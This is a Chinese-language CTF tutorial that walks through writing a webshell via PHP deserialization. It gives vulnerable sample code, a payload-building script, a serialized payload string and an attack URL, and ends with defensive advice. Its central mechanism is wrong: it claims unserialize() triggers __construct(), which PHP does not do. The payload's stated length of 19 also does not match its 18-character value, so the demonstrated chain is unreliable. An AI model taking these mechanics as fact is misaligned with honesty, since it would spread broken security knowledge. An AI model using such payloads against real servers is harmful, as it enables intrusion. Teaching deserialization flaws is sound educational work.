# CTF-Web历年考题精讲教程：P2：Ctf反序列化写shell 🐚

![](img/efee96cfbabe38f351af4e6dcd5b4008_1.png)

在本节课中，我们将学习如何利用PHP反序列化漏洞来写入Webshell。反序列化本身并非漏洞，但当它与可控的变量或特定的魔术方法结合时，就可能产生安全风险。我们将通过分析一段示例代码，演示如何构造序列化数据来控制程序行为，最终写入一个PHP文件。

## 代码分析与环境准备

首先，我们来看一下存在漏洞的示例代码。这段代码的核心功能是接收一个参数，对其进行反序列化操作。

```php
<?php
error_reporting(0); // 屏蔽错误信息
highlight_file(__FILE__); // 高亮显示当前文件源代码

![](img/efee96cfbabe38f351af4e6dcd5b4008_3.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_5.png)

class Demo {
    public $var = ‘123’;
    function __construct() {
        $f = fopen(“php.php”, “w”);
        fwrite($f, $this->var);
        fclose($f);
    }
}

![](img/efee96cfbabe38f351af4e6dcd5b4008_7.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_9.png)

$code = $_GET[‘code’];
if (isset($code)) {
    $str = unserialize($code);
    var_dump($str);
}
?>
```

![](img/efee96cfbabe38f351af4e6dcd5b4008_11.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_13.png)

代码解读：
*   `error_reporting(0);` 用于屏蔽所有错误提示。
*   `highlight_file(__FILE__);` 会在未传入`code`参数时，显示本页的PHP源代码。
*   类 `Demo` 包含一个公共属性 `$var` 和一个构造函数 `__construct()`。
*   构造函数会在类实例化时自动执行，其功能是创建并写入一个名为 `php.php` 的文件，内容为 `$this->var` 的值。
*   代码通过 `$_GET[‘code’]` 获取用户输入，并对其进行反序列化操作 `unserialize($code)`。

![](img/efee96cfbabe38f351af4e6dcd5b4008_15.png)

**漏洞点**在于：我们可以通过控制传入的`code`参数（即序列化后的字符串），来操控`Demo`类实例化后的`$var`属性值。由于构造函数会将该值写入文件，如果我们能让`$var`包含PHP代码，就能实现写入Webshell的目的。

上一节我们分析了漏洞代码的结构，本节中我们来看看如何构造攻击载荷。

![](img/efee96cfbabe38f351af4e6dcd5b4008_17.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_19.png)

## 构造恶意序列化数据

我们的目标是创建一个`Demo`类的序列化字符串，并且将其`$var`属性的值设置为我们希望写入的PHP代码（例如 `<?php phpinfo();?>`）。

![](img/efee96cfbabe38f351af4e6dcd5b4008_21.png)

以下是构造攻击载荷的步骤：

![](img/efee96cfbabe38f351af4e6dcd5b4008_23.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_25.png)

1.  **实例化类并修改属性**：首先，我们需要创建一个`Demo`类的对象，并将其`$var`属性修改为我们的PHP代码。
2.  **进行序列化**：然后，使用`serialize()`函数将这个对象序列化成字符串。
3.  **获取序列化字符串**：最后，输出这个字符串，作为我们攻击的`payload`。

![](img/efee96cfbabe38f351af4e6dcd5b4008_27.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_29.png)

我们可以编写一个简单的PHP脚本来完成这个操作：

![](img/efee96cfbabe38f351af4e6dcd5b4008_31.png)

```php
<?php
class Demo {
    public $var = ‘123’;
    function __construct() {
        $f = fopen(“php.php”, “w”);
        fwrite($f, $this->var);
        fclose($f);
    }
}

![](img/efee96cfbabe38f351af4e6dcd5b4008_33.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_34.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_36.png)

// 实例化类
$obj = new Demo();
// 修改属性值为我们想要写入的PHP代码
$obj->var = ‘<?php phpinfo();?>’;
// 序列化对象并输出
echo serialize($obj);
?>
```

![](img/efee96cfbabe38f351af4e6dcd5b4008_38.png)

运行上述脚本，我们将得到一个类似以下的序列化字符串：
`O:4:“Demo”:1:{s:3:“var”;s:19:“<?php phpinfo();?>”;}`

![](img/efee96cfbabe38f351af4e6dcd5b4008_39.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_41.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_42.png)

这个字符串描述了`Demo`类（`O:4:“Demo”`）有一个属性（`1`），属性名是长度为3的字符串`“var”`，其值是长度为19的字符串`“<?php phpinfo();?>”`。

![](img/efee96cfbabe38f351af4e6dcd5b4008_44.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_46.png)

## 实施攻击与写入Webshell

![](img/efee96cfbabe38f351af4e6dcd5b4008_48.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_50.png)

现在，我们已经拥有了恶意的序列化字符串。接下来，我们将其作为`code`参数的值，发送给存在漏洞的页面。

![](img/efee96cfbabe38f351af4e6dcd5b4008_52.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_54.png)

攻击流程如下：
1.  访问漏洞页面，并在URL后附加参数 `?code=[序列化字符串]`。
2.  服务器接收到参数后，执行 `unserialize($code)`。
3.  反序列化过程会重建`Demo`对象，此时`$var`属性的值已是我们设定的PHP代码。
4.  对象重建（实例化）会自动触发`__construct()`构造函数。
5.  构造函数执行，创建`php.php`文件，并将`$var`的值（即`<?php phpinfo();?>`）写入该文件。
6.  Webshell（`php.php`）被成功写入服务器目录。

![](img/efee96cfbabe38f351af4e6dcd5b4008_56.png)

我们可以直接在浏览器中访问如下链接（需对序列化字符串进行URL编码）：
`http://target.com/vuln.php?code=O:4:“Demo”:1:{s:3:“var”;s:19:“<?php phpinfo();?>”;}`

访问后，如果权限允许，将在`vuln.php`的同级目录下生成一个`php.php`文件，其内容为`<?php phpinfo();?>`。之后，我们访问`http://target.com/php.php`即可看到`phpinfo()`函数的输出信息，证明Webshell写入成功。

![](img/efee96cfbabe38f351af4e6dcd5b4008_58.png)

## 总结与防御建议

![](img/efee96cfbabe38f351af4e6dcd5b4008_60.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_62.png)

本节课中我们一起学习了如何利用PHP反序列化漏洞写入Webshell。核心是利用了反序列化过程会触发对象`__construct()`魔术方法的特性，通过控制序列化数据来操纵对象属性，进而执行危险的文件写入操作。

![](img/efee96cfbabe38f351af4e6dcd5b4008_64.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_66.png)

**关键点回顾**：
*   **漏洞成因**：用户可控的输入被直接用于`unserialize()`函数，且反序列化的对象包含危险的魔术方法（如`__construct`, `__destruct`, `__wakeup`等）。
*   **攻击链**：控制输入 -> 反序列化生成恶意对象 -> 触发魔术方法 -> 执行危险操作（如写文件）。
*   **核心公式**：`unserialize(用户可控数据) + 存在危险方法的类 = 反序列化漏洞`

![](img/efee96cfbabe38f351af4e6dcd5b4008_68.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_70.png)

**防御此类漏洞的建议**：
1.  **避免反序列化不可信数据**：尽量不要对用户传入的数据进行反序列化操作。
2.  **使用安全的白名单机制**：如果必须使用，应严格限制反序列化的类，例如使用`allowed_classes`选项。
3.  **对序列化数据进行签名验证**：确保数据在传输过程中未被篡改。
4.  **及时更新和修复**：关注PHP官方发布的安全更新，及时修复已知的序列化相关漏洞。

![](img/efee96cfbabe38f351af4e6dcd5b4008_72.png)

![](img/efee96cfbabe38f351af4e6dcd5b4008_74.png)

理解反序列化漏洞的原理，是Web安全学习中的重要一环。在后续课程中，我们还会遇到更复杂的反序列化利用链。